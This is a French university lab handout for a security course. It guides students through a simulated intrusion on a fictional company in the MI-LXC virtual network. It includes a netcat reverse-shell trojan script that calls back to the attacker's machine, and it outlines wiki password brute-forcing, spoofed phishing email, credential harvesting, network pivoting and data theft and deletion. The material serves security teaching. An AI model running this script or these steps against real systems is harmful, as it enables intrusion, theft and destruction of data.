# TP 1 : Intrusion

_François Lesueur ([francois.lesueur@insa-lyon.fr](mailto:francois.lesueur@insa-lyon.fr))_

Ce TP sera réalisé dans la VM MI-LXC disponible [ici](https://filesender.renater.fr/?s=download&token=48a9bf06-d3a3-4cc1-857a-a23c9513568d). L'infrastructure déployée simule plusieurs postes dont un SI d'entreprise (firewall, DMZ, intranet, authentification centralisée, serveur de fichiers, quelques postes de travail interne de l'entreprise _Target_), une machine d'attaquant (isp-a-hacker) et quelques autres servant à l'intégration de l'ensemble. La compréhension plus fine du SI de l'entreprise ciblée fait partie des objectifs du TP.

> Pour les curieux, le code de MI-LXC, qui sert à générer cette VM automatiquement, est disponible avec une procédure d'installation documentée [ici](https://github.com/flesueur/mi-lxc)

<!--  ou dans la VM "tp-sec-debian" disponible en salle de TP (`/machines_virtuelles/secu_vms/master/tp-sec-debian.sh`, debian/debian et root/root). L'infrastructure déployée simule plusieurs postes dont un SI d'entreprise (firewall, DMZ, intranet, authentification centralisée, serveur de fichiers, quelques postes de travail interne), une machine d'attaquant (hacker) et quelques autres servant à l'intégration de l'ensemble. La compréhension plus fine du SI de l'entreprise ciblée fait partie des objectifs du TP. -->


Vous devez vous connecter à la VM en root/root. MI-LXC est déjà installé et l'infrastructure déployée, il faut avec un terminal aller dans le dossier `/root/mi-lxc`. Pour démarrer l'infrastructure, tapez `./mi-lxc.py start`. Une fois l'environnement démarré, la seule machine à utiliser est évidemment celle du hacker, affichable avec la commande `./mi-lxc.py display isp-a-hacker`. Ceci lance un affichage sur la machine du hacker (avec l'outil "Xephyr"). Si la souris reste bloquée dans cette fenêtre, appuyez sur CTRL+SHIFT pour la libérer. Un tuto vidéo de démarrage est proposé [ici](https://videos.insa-lyon.net/videos/?video=MEDIA200924154800396).

> Dans la VM et sur les machines MI-LXC, vous pouvez installer des logiciels supplémentaires. Par défaut, vous avez mousepad pour éditer des fichiers de manière graphique. La VM peut être affichée en plein écran. Si cela ne fonctionne pas, il faut parfois changer la taille de fenêtre manuellement, en tirant dans l'angle inférieur droit, pour que VirtualBox détecte que le redimensionnement automatique est disponible. Il y a une case adéquate (taille d'écran automatique) dans le menu écran qui doit être cochée. Si rien ne marche, c'est parfois en redémarrant la VM que cela peut se déclencher. Mais il *faut* la VM en plein écran.


Déroulement général
===================

Votre objectif est de voler et détruire les informations internes de l'entreprise _Target_ (données comptables, base clients). Pour ce faire, vous travaillerez exclusivement sur la machine du hacker. Une première reconnaissance vous a amené à savoir que votre cible héberge un wiki sur `http://www.target.milxc`. Vous devrez réaliser les étapes suivantes :

* Récupération d'une adresse mail interne sur le wiki
* Altération du wiki en y intégrant un cheval de Troie prêt à être téléchargé par un interne
* Manipulation du commercial pour lui faire installer ce cheval de Troie (via un téléchargement interne donc plus crédible qu'une pièce jointe)
* Utilisation du cheval de Troie pour scanner le réseau interne
* Pivot vers la machine hébergeant les données ciblées
* Transfert puis suppression des données comptables et de la base clients
* Profit $$$

Le fil proposé ne couvre bien sûr pas l'ensemble des possibilités mais vise à montrer la diversité des moyens qu'un attaquant peut mettre en œuvre.

Préparation du cheval de Troie
==============================

Pour contrôler la machine du commercial, nous allons créer puis transmettre un cheval de Troie. Notre but est d'obtenir un shell sur la machine du commercial afin de l'utiliser comme pivot. Cependant, comme le firewall n'autorise pas les connexions vers l'intérieur de l'entreprise, nous allons plus spécifiquement envoyer un reverse-shell : c'est la machine du commercial qui initiera la connexion vers la machine du hacker.

Le code exemple suivant est disponible sur la machine du hacker (`/home/debian/tp/intrusion/trojan.sh`) :
```
#!/bin/bash
while [ 1 ]; do
	/bin/nc <IP Hacker> <Port Hacker> -q0 -e /bin/bash;
	sleep 1;
done
```

* Étudiez ce petit script, son fonctionnement, le programme nc (netcat). Pourquoi y a-t-il une boucle infinie ?
* Configurez et manipulez ce script en local pour ouvrir un reverse-shell avec vous-mêmes.
* Il existe plusieurs façons d'améliorer le shell obtenu (interactivité, gestion Ctrl-C, sortie d'erreur, autocomplétion, etc.), vous pouvez par exemple remplacer nc par socat comme expliqué [ici](https://artkond.com/2017/03/23/pivoting-guide/#beutifying-your-web-shell) ou appeler nc dans rlwrap.

> Une fois ce point compris, signalez-vous à un enseignant pour en discuter de vive voix

Altération du wiki
==================

Le wiki est accessible publiquement mais une authentification est nécessaire pour lire et écrire. Vous disposez dans le dossier `/home/debian/tp/intrusion` d'un script `dokuwiki.py` pour tenter de _bruteforcer_ l'authentification. Étudiez son fonctionnement puis tentez de découvrir un accès. Pour vous aider, des listes de mots de passes communs sont disponibles sur internet ([Wikipedia](https://en.wikipedia.org/wiki/Wikipedia:10,000_most_common_passwords)), un dictionnaire au format adapté au script fourni est proposé [ici](passwords.txt). À partir de cet accès, créez une page crédible (mise à jour, installation d'un logiciel, etc.), intégrant le `.sh` que vous aurez préparé comme reverse-shell.


Corruption de la machine du commercial
======================================

Vous devez maintenant amener le commercial à exécuter votre cheval de Troie sur sa machine. Vous devez faire attention à envoyer un mail crédible, social-engineering, qui pousse le commercial à suivre les instructions. Notamment, pensez à faire du SMTP spoofing en changeant votre identité d'expéditeur. Dans un cas réel, il suffirait qu'un seul employé installe le cheval de Troie pour que l'attaque fonctionne

Appelez l'enseignant pour jouer le rôle du commercial, vérifiez le fonctionnement.

> Si un problème technique empêche l'enseignant de réaliser cette partie, vous devez afficher la machine target-commercial en tant que commercial : `./mi-lxc.py display commercial@target-commercial`, puis aller lire les mails et réaliser les tâches demandées (le mail envoyé depuis le hacker doit apparaître ici).

Scan du réseau interne
======================

Il vous faut maintenant explorer le réseau pour trouver votre cible. Le programme `nmap` est un scanner réseau, installé sur la machine du hacker mais bien sûr pas du commercial. Il faut donc le transférer pour l'exécuter depuis la machine du commercial. Un serveur web est installé sur la machine du hacker et `nmap` est disponible dans le dossier `/usr/bin`. Le dossier `/var/www/html` du hacker est partagé par un serveur web, le programme en ligne de commande `wget` peut être utilisé côté commercial pour télécharger depuis ce dossier.

Utilisez maintenant nmap sur la machine du commercial pour explorer le réseau interne : `./nmap <adresse de réseau/masque>`. Dessinez un plan de réseau, les services ouverts, les logiciels utilisés, les sites accessibles, les contenus des index des sites web (accessibles avec wget ou curl). Soyez pertinent dans les adresses IP scannées, le scan est assez long.

> Pour connaître l'IP de la machine commercial : `/sbin/ifconfig`, utilisable en non-root pour la consultation des paramètres. Vous verrez que c'est un /16, la partie intéressante est au début de ce /16 : comme le scan est long, scannez plutôt les premiers /24.


Récupération d'un mot de passe valide
=====================================

Pour aller plus loin, vous aurez besoin d'un mot de passe valide sur le SI. Vous pouvez obtenir celui du commercial à partir de l'[analyse de son profil ClawsMail par exemple](https://github.com/AlessandroZ/LaZagne), en ajoutant un piège à son `.bashrc` lui demandant de retaper son mot de passe ou encore en intégrant la saisie lors du lancement du cheval de Troie.

Accès à la machine cible
========================

Pivotez vers la machine hébergeant les données ciblées. Pour faire du SSH, vous aurez besoin d'un shell [amélioré](https://artkond.com/2017/03/23/pivoting-guide/#beutifying-your-web-shell) ou d'utiliser [sshpass](https://srvfail.com/how-to-provide-ssh-password-inside-a-script-or-oneliner/) (disponible sur la machine du commercial). Vous pouvez ensuite utiliser la commande `find` avec les bons arguments pour trouver, sur cette machine cible, les fichiers sur lesquels vous pourriez avoir des droits en écriture.


Bonus
=====

Il existe un chemin d'attaque, qui sera plus difficile à contrôler côté firewall, qui rebondit par la machine `dev`...


Ouverture
=========

[_Ransomwares : quel mode opératoire en 2020 ?_, Amossys](https://blog.amossys.fr/ransomware-2020.html)

Disclaimer
==========

![Bad guy](media/bad.jpg)
_Attention, lui, il l'a fait pour de vrai..._
